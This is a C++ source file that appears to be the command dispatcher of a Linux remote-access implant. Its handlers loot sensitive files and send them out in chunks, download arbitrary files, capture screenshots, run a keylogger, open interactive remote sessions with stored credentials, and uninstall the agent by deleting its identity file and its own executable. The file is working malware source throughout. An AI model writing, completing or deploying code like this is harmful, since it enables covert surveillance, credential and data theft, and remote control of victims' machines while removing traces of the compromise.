#include "SessionManager.hpp"
#include "CommandDispatcher.hpp"
#include "ExfilEnvelope.hpp"
#include "LootArchive.hpp"
#include "ScreenshotCapture.hpp"

#include "Types.hpp"

#include <filesystem>
#include <fstream>
#include <limits.h>
#include <stdexcept>
#include <unistd.h>

namespace fs = std::filesystem;

namespace {

[[nodiscard]] std::vector<CommandResult> chunk_file_result(
    const CommandDAO& cmd,
    const std::string& encoded_data) {
    if (encoded_data.size() <= exfil::kMaxBeaconChunkBytes) {
        return {command_result::make(cmd, exfil::ExfilKind::File, encoded_data)};
    }

    const int chunk_total = static_cast<int>(
        (encoded_data.size() + exfil::kMaxBeaconChunkBytes - 1) / exfil::kMaxBeaconChunkBytes);

    std::vector<CommandResult> chunks;
    chunks.reserve(static_cast<std::size_t>(chunk_total));

    for (int index = 0; index < chunk_total; ++index) {
        const std::size_t offset = static_cast<std::size_t>(index) * exfil::kMaxBeaconChunkBytes;
        const std::size_t length = std::min(
            exfil::kMaxBeaconChunkBytes,
            encoded_data.size() - offset);

        const int status = (index == chunk_total - 1) ? exfil::kStatusSuccess : exfil::kStatusPending;
        chunks.push_back(command_result::make(
            cmd,
            exfil::ExfilKind::File,
            encoded_data.substr(offset, length),
            status,
            index,
            chunk_total));
    }

    return chunks;
}

[[nodiscard]] std::vector<CommandResult> single(CommandResult result) {
    return {std::move(result)};
}

} // namespace

CommandDispatcher::CommandDispatcher(
    int& current_sleep,
    Keylogger& keylogger,
    SessionManager& sessions,
    std::atomic<bool>& running,
    std::string user,
    std::string pass) {
    handlers_.push_back(std::make_unique<TimeoutCommandHandler>(current_sleep));
    handlers_.push_back(std::make_unique<ScreenshotCommandHandler>());
    handlers_.push_back(std::make_unique<LootCommandHandler>());
    handlers_.push_back(std::make_unique<DownloadCommandHandler>());
    handlers_.push_back(std::make_unique<KeyloggerStartHandler>(keylogger));
    handlers_.push_back(std::make_unique<KeyloggerStopHandler>(keylogger));
    handlers_.push_back(std::make_unique<SessionCommandHandler>(sessions, user, pass));
    handlers_.push_back(std::make_unique<CloseSessionCommandHandler>(sessions));
    handlers_.push_back(std::make_unique<UninstallCommandHandler>(running));
}

std::vector<CommandResult> CommandDispatcher::dispatch(const CommandDAO& cmd) {
    for (const auto& handler : handlers_) {
        if (handler->can_handle(cmd.command)) {
            return handler->execute(cmd.command, cmd);
        }
    }

    return {command_result::make(
        cmd,
        exfil::ExfilKind::Text,
        "Unknown command",
        exfil::kStatusFailed)};
}

std::vector<CommandResult> TimeoutCommandHandler::execute(std::string_view cmd, const CommandDAO& command) {
    try {
        const int sleep_minutes = std::stoi(std::string(cmd.substr(8)));
        current_sleep_ = sleep_minutes;
        return single(command_result::make(
            command,
            exfil::ExfilKind::Text,
            "Sleep interval updated to " + std::to_string(current_sleep_) + "m"));
    } catch (...) {
        return single(command_result::make(
            command,
            exfil::ExfilKind::Text,
            "Invalid timeout format",
            exfil::kStatusFailed));
    }
}

std::vector<CommandResult> ScreenshotCommandHandler::execute(std::string_view, const CommandDAO& command) {
    if (auto encoded = screenshot_capture::capture_base64_ppm()) {
        return single(command_result::make(command, exfil::ExfilKind::Screenshot, *encoded));
    }

    return single(command_result::make(
        command,
        exfil::ExfilKind::Screenshot,
        "Screenshot unavailable: no DISPLAY or X11 support",
        exfil::kStatusFailed));
}

std::vector<CommandResult> LootCommandHandler::execute(std::string_view, const CommandDAO& command) {
    const auto data = LootManager::execute_loot_command();
    if (data.empty()) {
        return single(command_result::make(
            command,
            exfil::ExfilKind::Loot,
            "No sensitive files found",
            exfil::kStatusFailed));
    }

    return single(command_result::make(command, exfil::ExfilKind::Loot, data));
}

std::vector<CommandResult> DownloadCommandHandler::execute(std::string_view cmd, const CommandDAO& command) {
    const std::string path_arg = std::string(cmd.substr(std::string_view("download ").size()));
    if (path_arg.empty()) {
        return single(command_result::make(
            command,
            exfil::ExfilKind::File,
            "ERROR: missing path",
            exfil::kStatusFailed));
    }

    std::error_code ec;
    const fs::path requested(path_arg);
    const fs::path resolved = fs::weakly_canonical(requested, ec);
    if (ec || !fs::exists(resolved) || !fs::is_regular_file(resolved)) {
        return single(command_result::make(
            command,
            exfil::ExfilKind::File,
            "ERROR: file not found",
            exfil::kStatusFailed));
    }

    const auto file_size = fs::file_size(resolved, ec);
    if (ec || file_size > exfil::kMaxFileBytes) {
        return single(command_result::make(
            command,
            exfil::ExfilKind::File,
            "ERROR: file too large",
            exfil::kStatusFailed));
    }

    std::ifstream file(resolved, std::ios::binary);
    if (!file) {
        return single(command_result::make(
            command,
            exfil::ExfilKind::File,
            "ERROR: cannot open file",
            exfil::kStatusFailed));
    }

    std::vector<unsigned char> bytes(file_size);
    if (!file.read(reinterpret_cast<char*>(bytes.data()), static_cast<std::streamsize>(file_size))) {
        return single(command_result::make(
            command,
            exfil::ExfilKind::File,
            "ERROR: read failed",
            exfil::kStatusFailed));
    }

    const auto encoded = loot_archive::encode_base64(bytes);
    return chunk_file_result(command, encoded);
}

std::vector<CommandResult> KeyloggerStartHandler::execute(std::string_view, const CommandDAO& command) {
    keylogger_.start(command.uid);
    return single(command_result::make(command, exfil::ExfilKind::Keylogger, "Keylogger started"));
}

std::vector<CommandResult> KeyloggerStopHandler::execute(std::string_view, const CommandDAO& command) {
    keylogger_.stop();
    return single(command_result::make(command, exfil::ExfilKind::Keylogger, "Keylogger stopped"));
}

std::vector<CommandResult> SessionCommandHandler::execute(std::string_view cmd, const CommandDAO& command) {
    try {
        const std::string command_text = std::string(cmd);
        const auto space = command_text.find_last_of(' ');
        if (space == std::string::npos || space <= 8) {
            throw std::runtime_error("invalid session command");
        }
        const std::string host = command_text.substr(8, space - 8);
        const int port = std::stoi(command_text.substr(space + 1));
        sessions_.start_session(generate_uuid(), host, port, user_, pass_);
        return single(command_result::make(command, exfil::ExfilKind::Text, "Interactive session requested"));
    } catch (...) {
        return single(command_result::make(
            command,
            exfil::ExfilKind::Text,
            "Invalid session command",
            exfil::kStatusFailed));
    }
}

std::vector<CommandResult> CloseSessionCommandHandler::execute(std::string_view, const CommandDAO& command) {
    sessions_.stop_sessions();
    return single(command_result::make(command, exfil::ExfilKind::Text, "Interactive sessions closed"));
}

std::vector<CommandResult> UninstallCommandHandler::execute(std::string_view, const CommandDAO& command) {
    std::error_code ec;
    std::filesystem::remove(std::filesystem::current_path() / "identity.dat", ec);

    char exec_path[PATH_MAX];
    const ssize_t len = readlink("/proc/self/exe", exec_path, sizeof(exec_path) - 1);
    if (len != -1) {
        exec_path[len] = '\0';
        std::filesystem::remove(exec_path, ec);
    }

    running_ = false;
    return single(command_result::make(command, exfil::ExfilKind::Text, "Agent uninstalled. Process exiting."));
}
